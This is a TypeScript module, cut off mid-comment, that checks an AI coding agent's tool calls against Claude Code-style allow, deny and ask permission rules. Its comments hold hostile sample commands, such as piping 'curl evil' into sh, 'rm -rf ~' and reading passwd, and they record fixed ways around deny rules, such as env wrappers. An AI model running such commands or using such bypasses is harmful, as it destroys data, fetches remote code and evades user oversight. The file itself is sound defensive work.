/**
 * Claude Code permission-rule matching (pure).
 *
 * Rules use Claude Code's settings.json syntax: a bare tool name ("Bash") or
 * "Tool(pattern)" ("Bash(npm run test:*)", "Edit(docs/**)"). Claude Code
 * PascalCase tool names are mapped to this package's pi tool names so users'
 * existing ~/.claude/settings.json files work unchanged.
 */

import { homedir } from "node:os";
import { isAbsolute, relative, resolve } from "node:path";
import { analyzeShellCommand, INLINE_SCRIPT_SHELLS, isUnknownTilde, leadTokens, movesDirectory, parseCommand, resolvePayload } from "../auto-mode/shell-analysis.ts";
import { pathArgument, resolveForContainment, toAbsolute, toAbsoluteBash } from "../auto-mode/paths.ts";
import { isSensitivePath } from "../auto-mode/sensitive.ts";
import { isProtectedPath, isWritingTool } from "./protected-paths.ts";
import {
	canonicalCommandName,
	canonicalizeStatement,
	powershellInjectionSyntax,
	powershellMatchForms,
	powershellReadOnly,
	powershellStatements,
} from "./powershell-rules.ts";
import { comparablePath, expandTilde, foldsCase, forwardSlashes, isRelativeInside, toPosixPath } from "../lib/paths.ts";
import { isShellToolName } from "../lib/shell-tools.ts";

export type PermissionMode = "default" | "acceptEdits" | "plan" | "bypassPermissions" | "dontAsk" | "auto";
/** "classify" is auto mode's outcome: hand the call to the approval classifier. */
export type PermissionDecision = "allow" | "deny" | "ask" | "classify";

/** Claude Code tool name (lowercased) → One Code tool name. */
const CC_TOOL_NAMES: Record<string, string> = {
	bash: "bash",
	powershell: "powershell",
	read: "read",
	edit: "edit",
	write: "write",
	grep: "grep",
	glob: "find",
	find: "find",
	ls: "ls",
	notebookedit: "notebook_edit",
	notebook_edit: "notebook_edit",
	webfetch: "web_fetch",
	web_fetch: "web_fetch",
	websearch: "web_search",
	web_search: "web_search",
	task: "Agent",
	agent: "Agent",
	subagent: "Agent", // pre-rename internal name, so old permission rules still match
	skill: "skill",
	toolsearch: "tool_search",
	tool_search: "tool_search",
	askuserquestion: "ask_user_question",
	ask_user_question: "ask_user_question",
	workflow: "workflow",
	taskcreate: "task_create",
	todowrite: "task_create", // CC's TodoWrite maps to our task list; steers a direct call to the task tools
	taskget: "task_get",
	tasklist: "task_list",
	taskupdate: "task_update",
	taskoutput: "task_output",
	taskstop: "task_stop",
	monitor: "monitor",
	schedulewakeup: "schedule_wakeup",
	croncreate: "cron_create",
	cronlist: "cron_list",
	crondelete: "cron_delete",
	sendmessage: "SendMessage",
	send_message: "SendMessage", // pre-rename internal name
	listagents: "list_agents",
	list_agents: "list_agents",
	enterworktree: "enter_worktree",
	exitworktree: "exit_worktree",
	lsp: "lsp_diagnostics", // CC defers a tool named `LSP`; our counterpart is lsp_diagnostics
	lsp_diagnostics: "lsp_diagnostics",
	listmcpresourcestool: "list_mcp_resources",
	readmcpresourcetool: "read_mcp_resource",
	readmcpresourcedirtool: "read_mcp_resource_dir",
};

export function normalizeToolName(name: string): string {
	if (name.startsWith("mcp__")) return name;
	const lower = name.toLowerCase();
	return CC_TOOL_NAMES[lower] ?? lower;
}

/**
 * Every Claude Code-style spelling that maps to this One Code tool name — the
 * inverse of CC_TOOL_NAMES, used by extensions/hooks to test CC hook matchers
 * ("Glob", "Task", …) against One Code tool names. Extending CC_TOOL_NAMES for
 * a new tool keeps hook matching current automatically.
 */
export function ccAliasesForTool(nativeName: string): string[] {
	return Object.entries(CC_TOOL_NAMES)
		.filter(([, mapped]) => mapped === nativeName)
		.map(([alias]) => alias);
}

export interface PermissionRule {
	raw: string;
	tool: string;
	pattern?: string;
}

/**
 * Parse "Tool" or "Tool(pattern)". Returns undefined for malformed rules. Tool
 * names may carry `-` and `.` — MCP tools keep their servers' hyphens
 * (`mcp__github__delete-repo`), and a rule naming one used to be dropped
 * silently (review P5) — and `:`, the plugin MCP namespace
 * (`mcp__plugin:name:server__tool`).
 */
export function parseRule(raw: string): PermissionRule | undefined {
	const trimmed = raw.trim();
	if (!trimmed) return undefined;
	const match = trimmed.match(/^([A-Za-z0-9_.:-]+)(?:\((.*)\))?$/s);
	if (!match) return undefined;
	const [, name, pattern] = match;
	return { raw: trimmed, tool: normalizeToolName(name), pattern: pattern || undefined };
}

/** Parsed rules plus the raw strings that could not be parsed, so a caller can report them. */
export function parseRulesReport(raws: string[]): { rules: PermissionRule[]; dropped: string[] } {
	const rules: PermissionRule[] = [];
	const dropped: string[] = [];
	for (const raw of raws) {
		const rule = parseRule(raw);
		if (rule) rules.push(rule);
		else if (raw.trim()) dropped.push(raw.trim());
	}
	return { rules, dropped };
}

export function parseRules(raws: string[]): PermissionRule[] {
	return parseRulesReport(raws).rules;
}

/**
 * Whether a bash pattern has a `*` that is a wildcard — i.e. not written `\*`.
 * Claude Code's escape syntax: `\*` is a literal asterisk, `\\` a literal
 * backslash. A pattern with no unescaped `*` is an exact command.
 */
export function hasUnescapedWildcard(pattern: string): boolean {
	for (let i = 0; i < pattern.length; i++) {
		if (pattern[i] === "\\") {
			i++;
			continue;
		}
		if (pattern[i] === "*") return true;
	}
	return false;
}

/** The literal command an exact (wildcard-free) bash pattern stands for. */
export function unescapeLiteral(pattern: string): string {
	return pattern.replace(/\\([*\\])/g, "$1");
}

/**
 * Spell a literal command as a bash pattern that matches exactly it — `*` and
 * `\` escaped — for rules minted from an approved command ("don't ask again
 * this session"). Without this `ls *.ts` became a glob matching
 * `ls ; rm -rf ~ #.ts` (review P7).
 */
export function escapeLiteral(command: string): string {
	return command.replace(/[\\*]/g, (ch) => `\\${ch}`);
}

/** Glob → RegExp. `**` crosses path separators, `*` does not. `\*` / `\\` are literals. */
function globToRegex(glob: string, pathMode: boolean, ignoreCase = false): RegExp {
	let out = "";
	for (let i = 0; i < glob.length; i++) {
		const ch = glob[i];
		if (ch === "\\" && (glob[i + 1] === "*" || glob[i + 1] === "\\")) {
			out += `\\${glob[i + 1]}`;
			i++;
		} else if (ch === "*") {
			if (pathMode && glob[i + 1] === "*") {
				out += ".*";
				i++;
				if (glob[i + 1] === "/") i++; // "**/" also matches zero directories
			} else {
				out += pathMode ? "[^/]*" : ".*";
			}
		} else if ("\\^$.|?+()[]{}".includes(ch)) {
			out += `\\${ch}`;
		} else {
			out += ch;
		}
	}
	return new RegExp(`^${out}$`, ignoreCase ? "i" : "");
}

/**
 * Bash pattern match against ONE command (no `&&`/`|`/`;`), Claude Code
 * semantics (`utils/permissions/shellRuleMatching.ts` + `bashPermissions.ts`):
 * - exact rule: the whole command, character for character;
 * - prefix rule `npm test:*`: the command IS `npm test` or starts with
 *   `npm test ` — the boundary is a literal space, so `git:*` does not cover
 *   `gitk` (and, as in CC, `npm run test:*` does not cover `npm run test:unit`;
 *   write `npm run test:unit:*` or `npm run test*` for that). The bare
 *   `xargs <prefix>` spelling counts too, so `Bash(rm:*)` as a deny still
 *   catches `xargs rm`;
 * - wildcard rule (`*` anywhere else): `*` matches any run of characters; a
 *   single trailing ` *` also matches the bare command (`git *` covers `git`).
 * Compound commands are handled by the callers: {@link ruleMatches} (deny/ask
 * — any subcommand) and {@link findBashAllowRule} (allow — every subcommand).
 */
export function matchesBashPattern(pattern: string, command: string): boolean {
	const cmd = command.trim();
	if (pattern.endsWith(":*")) {
		const prefix = pattern.slice(0, -2);
		if (cmd === prefix || cmd.startsWith(`${prefix} `)) return true;
		const viaXargs = `xargs ${prefix}`;
		return cmd === viaXargs || cmd.startsWith(`${viaXargs} `);
	}
	if (hasUnescapedWildcard(pattern)) {
		let regex = globToRegex(pattern, false);
		const stars = pattern.split("*").length - 1;
		if (stars === 1 && pattern.endsWith(" *")) {
			const source = regex.source.slice(0, -" .*$".length);
			regex = new RegExp(`${source}( .*)?$`);
		}
		return regex.test(cmd);
	}
	return cmd === unescapeLiteral(pattern);
}

/**
 * The separately-executing subcommands of a bash command line — what `&&`,
 * `||`, `;`, `|`, `&`, and unquoted newlines separate — or undefined when the
 * line cannot be parsed or uses a construct the pre-gate does not model (a
 * subshell, a loop, a function): an allow rule covers the commands its author
 * wrote, not `(npm test)` or a loop around them. A single simple command comes
 * back as itself. The commands inside a substitution are not listed: they are
 * part of the subcommand whose word they compute ({@link findBashAllowRule}).
 */
export function bashSubcommands(command: string): string[] | undefined {
	const { segments, parseFailed, complex } = parseCommand(command.trim());
	if (parseFailed || complex) return undefined;
	return segments.filter((seg) => seg.substitution === undefined).map((seg) => seg.raw).filter((raw) => raw.length > 0);
}

/** Redirect targets that are devices, never files: always fine under an allow rule. */
const DEVICE_TARGETS = new Set(["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty"]);

/** The script a `sh -c '…'` / `bash -lc '…'` invocation runs, if any. */
function inlineShellScript(args: string[]): string | undefined {
	for (let i = 0; i < args.length - 1; i++) {
		if (/^-[a-zA-Z]*c$/.test(args[i])) return args[i + 1];
	}
	return undefined;
}

/**
 * The pieces of a line the grammar could not parse, split at every separator
 * and substitution opener, for the deny forms only. Rough on purpose: a deny
 * form may only widen, and `cat <<EOF; rm y` (a heredoc whose body comes later
 * on the line) must still meet `Bash(rm:*)`.
 */
function roughPieces(line: string): string[] {
	return line
		.split(/[;&|\n()`]|\$\(|[<>]\(/)
		.map((piece) => piece.trim())
		.filter((piece) => piece && piece !== line);
}

/**
 * Every spelling of a command line a deny/ask pattern is tested against: the
 * raw line, each subcommand, and each subcommand's *payload form* — transparent
 * wrappers peeled (`env`, `command`, `nice`, `timeout`, `xargs`, …), the
 * commands inside subshells, groups and substitutions, the command word reduced to its lowercased
 * basename (`/bin/rm`, `\rm`, `RM` → `rm`), and a `sh|bash|zsh -c '…'` script,
 * an `eval` line, a `trap` handler and a `find -exec` command expanded
 * recursively. Claude Code strips the same wrappers before its deny
 * check (`bashPermissions.ts stripSafeWrappers`); until 2026-09-05 `env rm -f
 * x` ran past `Bash(rm:*)` here after a plain "Allow bash?" prompt
 * (PERMISSIONS-REVIEW-2026-09-05 M1). Deny/ask only — an allow rule keeps
 * matching the literal spelling (findBashAllowRule), so widening here can only
 * make the gate stricter.
 */
export function bashMatchForms(command: string, depth = 0): string[] {
	const forms = new Set<string>();
	const trimmed = command.trim();
	if (!trimmed) return [];
	forms.add(trimmed);
	if (depth > 4) return [...forms];
	const nested: string[] = [];
	// The commands inside `$(…)`, backticks and `<(…)` are segments of their
	// own. A line that did not parse still gives its best-effort segments, and
	// its rough pieces besides.
	const { segments, parseFailed } = parseCommand(trimmed);
	if (parseFailed) nested.push(...roughPieces(trimmed));
	// A shell on the line may run its input, a `-c` script included (`sh -c
	// 'eval "$(cat)"'`). Then every heredoc and here-string on the line, and
	// the words an `echo`/`printf` prints, may be the script it reads
	// (`sh <<'EOF'`, `cat <<EOF | sh`, `echo 'rm -rf x' | sh`). Only then, so
	// a commit message mentioning `rm` never meets `Bash(rm:*)`.
	const payloads = segments.map((segment) => resolvePayload(leadTokens(segment), "wide"));
	if (payloads.some((payload) => INLINE_SCRIPT_SHELLS.has(payload.command))) {
		for (const [index, segment] of segments.entries()) {
			nested.push(...(segment.stdin ?? []));
			const { command: printer, args } = payloads[index];
			if (printer === "echo" || printer === "printf") nested.push(args.map((token) => token.value).filter((value) => !/^-[neE]+$/.test(value)).join(" "));
		}
	}
	for (const segment of segments) {
		if (segment.raw) forms.add(segment.raw);
		const tokens = leadTokens(segment);
		if (tokens.length === 0) continue;
		// The wide reading also peels sudo/doas and returns the command lines
		// wrapper options carry (`flock -c`, `env -S`).
		const payload = resolvePayload(tokens, "wide");
		nested.push(...payload.scripts);
		if (!payload.command) continue;
		const args = payload.args.map((token) => token.value);
		forms.add([payload.command, ...args].join(" "));
		if (INLINE_SCRIPT_SHELLS.has(payload.command)) {
			const script = inlineShellScript(args);
			if (script) nested.push(script);
		}
		// `eval` runs its arguments joined into one command line.
		if (payload.command === "eval") nested.push(args.join(" "));
		// `trap 'cmd' EXIT` runs its first argument later, as a command line.
		if (payload.command === "trap") {
			const handler = args[args[0] === "--" ? 1 : 0];
			if (handler && !handler.startsWith("-")) nested.push(handler);
		}
		// `find … -exec cmd {} ;` runs cmd on every match.
		if (payload.command === "find") {
			for (const [index, arg] of args.entries()) {
				if (!["-exec", "-execdir", "-ok", "-okdir"].includes(arg)) continue;
				const end = args.findIndex((word, at) => at > index && (word === ";" || word === "+"));
				nested.push(args.slice(index + 1, end < 0 ? undefined : end).join(" "));
			}
		}
	}
	for (const script of nested) for (const form of bashMatchForms(script, depth + 1)) forms.add(form);
	return [...forms];
}

/**
 * A bash deny/ask rule matches when its pattern covers the WHOLE command, ANY
 * subcommand of it, or any subcommand's payload form ({@link bashMatchForms}) —
 * wrapping `rm -rf x` in `ls && rm -rf x` or `env rm -rf x` must not slip past
 * `Bash(rm:*)` (CC: "deny/ask rules must match compound commands so they can't
 * be bypassed"). Unparseable lines are matched as a whole only.
 */
/**
 * "Any form matches" with a one-entry memo of the forms: decide() tests every
 * deny rule, then every ask rule, against the same command, and the forms
 * depend on the command alone, so the last parse is kept per shell grammar.
 */
function anyFormMatcher(formsOf: (command: string) => string[], matches: (pattern: string, form: string) => boolean) {
	let last: { command: string; forms: string[] } | undefined;
	return (pattern: string, command: string): boolean => {
		if (last?.command !== command) last = { command, forms: formsOf(command) };
		return last.forms.some((form) => matches(pattern, form));
	};
}

const bashPatternMatchesAny = anyFormMatcher(bashMatchForms, matchesBashPattern);

/**
 * PowerShell's Bash-pattern match against ONE statement: both sides have their
 * command word alias-canonicalized (`ls` ≡ `Get-ChildItem`) and are compared
 * case-insensitively (cmdlet names are), then Claude Code's Bash pattern rules
 * apply unchanged — exact, `prefix:*`, wildcards (powershell-rules.ts).
 */
export function matchesPowerShellPattern(pattern: string, statement: string): boolean {
	const canonicalPattern = pattern.endsWith(":*")
		? `${canonicalizeStatement(pattern.slice(0, -2))}:*`
		: canonicalizeStatement(pattern);
	return matchesBashPattern(canonicalPattern.toLowerCase(), canonicalizeStatement(statement).toLowerCase());
}

/** Deny/ask semantics for PowerShell: the pattern covers the line, any statement, or any canonical/nested form. */
const powershellPatternMatchesAny = anyFormMatcher(powershellMatchForms, matchesPowerShellPattern);

/** The tools whose subject is a shell command line and whose rules follow the Bash shape (lib/shell-tools.ts). */
export function isShellTool(toolName: string): boolean {
	return isShellToolName(normalizeToolName(toolName));
}

/**
 * The allow rule that lets a bash command run, or undefined. CC semantics: an
 * EXACT rule equal to the whole command allows it outright (the user approved
 * that literal string); otherwise the command is split into subcommands and
 * every one of them must be covered by some allow rule — `Bash(npm test:*)`
 * alone never covers `npm test && curl evil | sh`, while `Bash(npm test:*)` +
 * `Bash(git status:*)` together cover `npm test && git status`. `eval`, `sh`
 * or `xargs` is a subcommand like any other, so it needs a rule of its own.
 *
 * A command or process substitution runs its commands to compute a word of
 * the subcommand around it, so each of those commands must be covered too:
 * by a rule, or, for the whole substitution at once, by `readOnly` (the
 * auto-mode pre-gate's proof that it reads only inside the working directory
 * and writes nothing). So `Bash(git commit:*)` covers `git commit -m "$(cat
 * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. The read-only shortcut
 * is off when the line moves directory first (`cd /etc && git commit -m
 * "$(cat passwd)"`), since the check resolves paths from the working
 * directory. An unparseable line, or one with a construct the pre-gate does
 * not model, is not covered. The rule returned is the first one that covered
 * a subcommand (for the "allowed by rule …" note).
 */
export function findBashAllowRule(
	rules: PermissionRule[],
	command: string,
	toolName = "bash",
	opts: { readOnly?: (command: string) => boolean } = {},
): PermissionRule | undefined {
	const cmd = command.trim();
	if (!cmd) return undefined;
	// `monitor` carries a shell command too and is judged with the same
	// semantics; its rules are `monitor(...)`, never `bash(...)`.
	const bashRules = rules.filter((r) => ruleCoversTool(r.tool, toolName));
	const bare = bashRules.find((r) => !r.pattern);
	if (bare) return bare;
	const exact = bashRules.find(
		(r) => r.pattern !== undefined && !hasUnescapedWildcard(r.pattern) && unescapeLiteral(r.pattern) === cmd,
	);
	if (exact) return exact;
	// PowerShell lines split on PowerShell's separators and match alias-
	// canonicalized, case-insensitively (powershell-rules.ts), and a line with
	// injection syntax is never covered.
	if (normalizeToolName(toolName) === "powershell") {
		if (powershellInjectionSyntax(cmd)) return undefined;
		const statements = powershellStatements(cmd);
		if (!statements || statements.length === 0) return undefined;
		let first: PermissionRule | undefined;
		for (const statement of statements) {
			const rule = bashRules.find((r) => r.pattern !== undefined && matchesPowerShellPattern(r.pattern, statement));
			if (!rule) return undefined;
			first ??= rule;
		}
		return first;
	}
	const parsed = parseCommand(cmd);
	if (parsed.parseFailed || parsed.complex) return undefined;
	const ruleFor = (raw: string) => bashRules.find((r) => r.pattern !== undefined && matchesBashPattern(r.pattern, raw));
	const topLevel = parsed.segments.filter((seg) => seg.substitution === undefined && seg.raw.length > 0);
	if (topLevel.length === 0) return undefined;
	let first: PermissionRule | undefined;
	for (const seg of topLevel) {
		const rule = ruleFor(seg.raw);
		if (!rule) return undefined;
		first ??= rule;
	}
	const topLevelMoves = topLevel.some(movesDirectory);
	for (const [index, text] of parsed.substitutions.entries()) {
		const inner = parsed.segments.filter((seg) => seg.substitution === index);
		if (inner.every((seg) => ruleFor(seg.raw))) continue;
		if (!topLevelMoves && opts.readOnly?.(text)) continue;
		return undefined;
	}
	return first;
}

/**
 * Path pattern match against the RESOLVED forms of the subject — absolute
 * (with `.`/`..` normalised), cwd-relative, and `~/`-relative — never the raw
 * spelling: `Edit(docs/**)` must not match `docs/../src/main.ts`, and a
 * `~/.ssh/id_rsa` subject must hit `Read(~/.ssh/**)` (review P6).
 *
 * Every candidate is spelled with forward slashes: patterns are `/`-globs
 * (gitignore semantics, as in Claude Code), so on Windows the native
 * `C:\Users\x\docs\a.md` is matched as Claude Code matches it — its POSIX form
 * `/c/Users/x/docs/a.md` (`lib/paths.ts toPosixPath`, the shape CC's own
 * Windows rules such as `Read(//c/Users/x/**)` are written in) — and also as
 * `C:/Users/x/docs/a.md`, so a rule spelled with the drive letter works too.
 * darwin and win32 compare case-insensitively, like their filesystems.
 */
export function matchesPathPattern(pattern: string, subject: string, cwd: string): boolean {
	const home = homedir();
	const win32 = process.platform === "win32";
	// Claude Code's rule syntax: `//path` is an absolute filesystem path (the
	// doubled slash distinguishes it from `/path`, which CC reads relative to
	// the project root). `Read(//etc/**)` is the form CC's own suggestions write.
	// A Windows pattern spelled with backslash separators is read as its `/`
	// form; `\*` and `\\` stay the literal escapes globToRegex documents.
	const spelled = win32 ? pattern.replace(/\\(?![*\\])/g, "/") : pattern;
	// `~` in a pattern expands to the home dir spelled with `/` (never `join`,
	// whose backslashes would read as escapes on Windows); it matches the
	// `C:/Users/x/…` candidate below.
	const expandHome = (p: string) => (p === "~" ? forwardSlashes(home) : p.startsWith("~/") ? `${forwardSlashes(home)}/${p.slice(2)}` : p);
	const expandedPattern = expandHome(spelled.startsWith("//") ? spelled.slice(1) : spelled);
	const expandedSubject = expandTilde(subject, home);

	const candidates = new Set<string>();
	const absolute = isAbsolute(expandedSubject) ? resolve(expandedSubject) : resolve(cwd, expandedSubject);
	candidates.add(toPosixPath(absolute));
	if (win32) candidates.add(forwardSlashes(absolute));
	const rel = relative(cwd, absolute);
	if (isRelativeInside(rel)) candidates.add(forwardSlashes(rel));
	const homeRel = relative(resolve(home), absolute);
	if (isRelativeInside(homeRel)) candidates.add(`~/${forwardSlashes(homeRel)}`);

	// Case-insensitive where the filesystem is (darwin, win32): `Read(~/Notes/**)`
	// covers `~/notes/a.md`, the same file there — the rule every other
	// containment check in this file compares by (comparablePath).
	const regex = globToRegex(expandedPattern, true, foldsCase());
	for (const candidate of candidates) {
		if (regex.test(candidate)) return true;
	}
	return false;
}

/**
 * What kind of thing a tool's subject is, which decides how a rule pattern is
 * matched against it and how a session grant is scoped: a shell command line
 * (bash-pattern semantics), a filesystem path (path globs against the resolved
 * forms), a URL (Claude Code's `domain:` form), or plain text (a glob).
 */
export type SubjectKind = "command" | "path" | "url" | "text";

export function subjectKind(toolName: string): SubjectKind {
	const name = normalizeToolName(toolName);
	if (isShellToolName(name) || name === "monitor") return "command";
	if (name === "web_fetch") return "url";
	if (isPathSubjectTool(name)) return "path";
	return "text";
}

/** A tool call's arguments as one line, for a prompt that would otherwise read "(no arguments)". */
function compactArguments(input: Record<string, unknown>): string {
	if (Object.keys(input).length === 0) return "";
	try {
		return JSON.stringify(input);
	} catch {
		return "";
	}
}

/**
 * The argument a rule pattern applies to — and the thing the user is shown in
 * an approval prompt — per tool. Until 2026-09-05 everything but bash fell
 * back to a `path` argument, so a `web_fetch`, `monitor` or `enter_worktree`
 * prompt read "(no arguments)" and the user approved blind
 * (PERMISSIONS-REVIEW-2026-09-05 M5). A tool with none of the named fields
 * shows its arguments compactly (MCP tools in particular).
 */
export function extractSubject(toolName: string, input: Record<string, unknown>): string {
	const name = normalizeToolName(toolName);
	const str = (key: string): string | undefined => (typeof input[key] === "string" ? (input[key] as string) : undefined);
	switch (name) {
		case "bash":
		case "powershell":
		case "monitor":
			return str("command") ?? "";
		case "web_fetch":
			return str("url") ?? "";
		case "web_search":
			return str("query") ?? "";
		case "enter_worktree":
			return str("name") ?? str("path") ?? "";
		case "read_mcp_resource":
		case "read_mcp_resource_dir":
			return str("uri") ?? "";
	}
	if (isPathSubjectTool(name)) return pathArgument(input) ?? "";
	return pathArgument(input) ?? compactArguments(input);
}

/** The lowercased host of a URL, or undefined when it does not parse (a bare `example.com/x` is tried as https). */
export function urlHost(url: string): string | undefined {
	for (const candidate of [url, `https://${url}`]) {
		try {
			const host = new URL(candidate).hostname.toLowerCase();
			if (host) return host;
		} catch {
			// try the next spelling
		}
	}
	return undefined;
}

/**
 * URL rule match: Claude Code's `WebFetch(domain:example.com)` form compares
 * the URL's host exactly; any other pattern is a glob over the whole URL.
 */
function matchesUrlPattern(pattern: string, url: string): boolean {
	const domain = pattern.match(/^domain:(.+)$/)?.[1]?.trim().toLowerCase();
	if (domain) return urlHost(url) === domain;
	return globToRegex(pattern, false).test(url);
}

/**
 * Whether `candidate` names plan mode's one writable file, after ~-expansion
 * and cwd resolution of both sides. Compared case-folded: the resolved subject
 * arrives case-folded from `resolveForContainment`, and without folding that
 * branch of the check could never match on macOS.
 */
/**
 * Expand a leading `~/`, resolve against cwd, and case-fold where the
 * filesystem does (darwin/win32) — the same shape `resolveForContainment`
 * folds its output to, so a subject compared here matches. Linux stays
 * case-sensitive: folding there would make `/home/u/PROJECT` read as inside
 * `/home/u/project`.
 */
function toAbsoluteFolded(p: string, cwd: string): string {
	return comparablePath(resolve(cwd, expandTilde(p, homedir())));
}

function isPlanFilePath(candidate: string, planFilePath: string, cwd: string): boolean {
	return toAbsoluteFolded(candidate, cwd) === toAbsoluteFolded(planFilePath, cwd);
}

/**
 * Whether `candidate` lands *inside* `dir` (a harness-designated session
 * directory: the auto-memory dir, the scratchpad). `resolve()` normalizes
 * `..` segments first, so a traversal spelled through the dir does not clear.
 * Compared case-folded, like isProtectedPath: the resolved subject arrives
 * case-folded from `resolveForContainment`.
 */
export function isInsideDir(candidate: string, dir: string, cwd: string): boolean {
	return toAbsoluteFolded(candidate, cwd).startsWith(`${toAbsoluteFolded(dir, cwd)}/`);
}

/** `isInsideDir`, plus the directory itself (`ls <cwd>` lists the working directory). */
export function isAtOrInsideDir(candidate: string, dir: string, cwd: string): boolean {
	return toAbsoluteFolded(candidate, cwd) === toAbsoluteFolded(dir, cwd) || isInsideDir(candidate, dir, cwd);
}

/**
 * Whether one rule matches a call. For bash this is the deny/ask ("any
 * subcommand") semantics — allow rules go through {@link findBashAllowRule}.
 */
export function ruleMatches(rule: PermissionRule, toolName: string, subject: string, cwd: string): boolean {
	if (!ruleCoversTool(rule.tool, toolName)) return false;
	if (!rule.pattern) return true;
	if (!subject) return false;
	switch (subjectKind(toolName)) {
		case "command":
			return normalizeToolName(toolName) === "powershell"
				? powershellPatternMatchesAny(rule.pattern, subject)
				: bashPatternMatchesAny(rule.pattern, subject);
		case "path":
			return matchesPathPattern(rule.pattern, subject, cwd);
		case "url":
			return matchesUrlPattern(rule.pattern, subject);
		case "text":
			return globToRegex(rule.pattern, false).test(subject);
	}
}

/**
 * Whether a rule's tool covers a call's tool: the same name, or Claude Code's
 * server-wide MCP form — `mcp__github` covers every `mcp__github__*` tool, and
 * `mcp__plugin:x:server` the plugin-namespaced form. A rule naming a specific
 * tool (`mcp__github__delete_repo`, two `__` groups) stays exact. Until
 * 2026-09-05 the server-wide spelling, the natural way to keep an agent off a
 * server, matched nothing (PERMISSIONS-REVIEW-2026-09-05 M3).
 */
export function ruleCoversTool(ruleTool: string, toolName: string): boolean {
	const tool = normalizeToolName(toolName);
	if (ruleTool === tool) return true;
	if (!ruleTool.startsWith("mcp__")) return false;
	const server = ruleTool.slice("mcp__".length);
	return server.length > 0 && !server.includes("__") && tool.startsWith(`${ruleTool}__`);
}

/** Risk tier drives the unmatched-rule default. */
export type ToolTier = "safe" | "edit" | "execute" | "custom";

const SAFE_TOOLS = new Set(["read", "grep", "find", "ls"]);
const EDIT_TOOLS = new Set(["edit", "write", "notebook_edit"]);

export function toolTier(toolName: string): ToolTier {
	const name = normalizeToolName(toolName);
	if (SAFE_TOOLS.has(name)) return "safe";
	if (EDIT_TOOLS.has(name)) return "edit";
	if (isShellToolName(name)) return "execute";
	return "custom";
}

/**
 * Whether a tool's subject is a filesystem path whose RESOLVED form the gate
 * judges (protected paths, working-directory containment): the writing tools
 * and the read tier. A bash subject is a command line; a custom tool's is
 * whatever pathArgument found, not necessarily a path. Callers pass
 * `resolveForContainment(toAbsolute(...))` as `resolvedSubject` for these only.
 */
export function isPathSubjectTool(toolName: string): boolean {
	const name = normalizeToolName(toolName);
	return isWritingTool(name) || toolTier(name) === "safe";
}

/**
 * Tools that never need approval: they change no state outside the session and
 * touch no network or filesystem the user hasn't already opted into.
 *
 * `tool_search` and `skill` matter more than they look — gating them breaks
 * deferred tool loading and skill invocation entirely in non-interactive runs,
 * since a blocked loader means the model can never reach the tools behind it.
 */
export const AUTO_ALLOWED_TOOLS = new Set<string>([
	"ask_user_question",
	"ask_user",
	// Loads tool schemas and packaged instructions; no side effects.
	"tool_search",
	"skill",
	// Read-only inspection.
	"lsp_diagnostics",
	"list_mcp_resources",
	"list_agents",
	// Subagent orchestration is safe to launch; each child enforces its own
	// tool permissions via the in-process permission gate.
	"Agent",
	// Same reasoning for workflow: the script itself cannot touch the
	// filesystem, network, or shell — only spawn agents, and every one of those
	// runs behind the workflow permission gate.
	"workflow",
	// Plan-mode transitions must work inside plan mode itself.
	"enter_plan_mode",
	"exit_plan_mode",
	// Session-state bookkeeping.
	"task_create",
	"task_get",
	"task_list",
	"task_update",
	// Inspecting/stopping background work this session already started.
	"task_output",
	"task_stop",
	// The session's cron store: timers that replay a prompt, and listing and
	// cancelling them. (schedule_wakeup and cron_create are here for every mode
	// but auto, where CLASSIFY_IN_AUTO_TOOLS sends them to the classifier.)
	"schedule_wakeup",
	"cron_list",
	"cron_delete",
	"cron_create",
	// Resumes/messages an agent — same reasoning as Agent: the child enforces its
	// own tool permissions. (monitor and enter/exit_worktree stay gated: they
	// run arbitrary shell commands / mutate the filesystem.)
	"SendMessage",
]);

export interface DecideInput {
	toolName: string;
	subject: string;
	cwd: string;
	mode: PermissionMode;
	deny: PermissionRule[];
	ask: PermissionRule[];
	allow: PermissionRule[];
	/** Auto mode: route every shell command through the classifier, ignoring narrow Bash allow rules. */
	classifyAllShell?: boolean;
	/**
	 * The subject with symlinks resolved (see auto-mode/paths.ts), when the
	 * caller could resolve it. The protected-path check consults it as well as
	 * the literal spelling, so writing through `ln -s .git/hooks build` is as
	 * protected as writing `.git/hooks` directly. Kept a separate input so this
	 * module stays pure — resolution touches the filesystem.
	 */
	resolvedSubject?: string;
	/**
	 * Plan mode's one writable file (see extensions/plan-mode). Absolute or
	 * ~-prefixed; writes whose subject resolves to it are allowed even in plan
	 * mode.
	 */
	planFilePath?: string;
	/**
	 * The session's auto-memory directory (see extensions/memory). Absolute or
	 * ~-prefixed; writes landing inside it are allowed — the system prompt
	 * itself instructs them — though deny and ask rules still win.
	 */
	memoryDirPath?: string;
	/**
	 * The session's scratchpad directory (see extensions/lib/scratchpad); the
	 * system prompt directs all temp files there, with the same treatment as
	 * the memory dir.
	 */
	scratchpadDirPath?: string;
	/**
	 * The working directory's own resolved form (`resolveForContainment(cwd)`),
	 * when the caller could resolve it. A resolved subject is compared against
	 * it as well as the literal cwd: on macOS a project under `/var/folders`
	 * resolves to `/private/var/folders`, and without this every in-project
	 * path read as outside the working directory. Kept an input so this module
	 * stays pure.
	 */
	resolvedCwd?: string;
	/**
	 * Where the session persists oversized tool outputs (`lib/persisted-output.ts
	 * sessionResultsDir`). Readable like the working directory: the model is
	 * told to read those files back.
	 */
	resultsDirPath?: string;
	/**
	 * This project's pi session directory (`<agentDir>/sessions/<encoded-cwd>`):
	 * the session transcripts and, next to them, auto mode's decision log.
	 * Readable like the working directory — Claude Code lets a session read
	 * its own project directory under its config root, which is where its
	 * transcripts live (`checkReadableInternalPath`, "Project directory files
	 * are allowed for reading"), and /doctor's evidence gathering depends on
	 * it. Other projects' session directories are not in the set. Never a
	 * write root: the agent dir stays protected.
	 */
	sessionDirPath?: string;
	/**
	 * Directories protected at runtime, beyond the static list in
	 * protected-paths.ts (see `runtimeProtectedDirs()`, the sole producer): pi's
	 * own agent directory (`getAgentDir()` — `~/.pi/agent` for stock pi,
	 * `~/.onecode/agent` bundled), Claude Code's config dir (`claudeConfigDir()`)
	 * and One Code's state dir (`oneCodeStateDir()`). The last two catch a
	 * relocated `CLAUDE_CONFIG_DIR` / `ONECODE_STATE_DIR`, which the static
	 * segment list cannot (distribution review 2026-09-09, L2). Absolute paths; a
	 * write landing inside one is judged like a protected path
	 * (PERMISSIONS-REVIEW-2026-09-05 M7).
	 */
	protectedDirs?: string[];
	/**
	 * The workspace directories in force (permissions/workspace.ts), absolute and
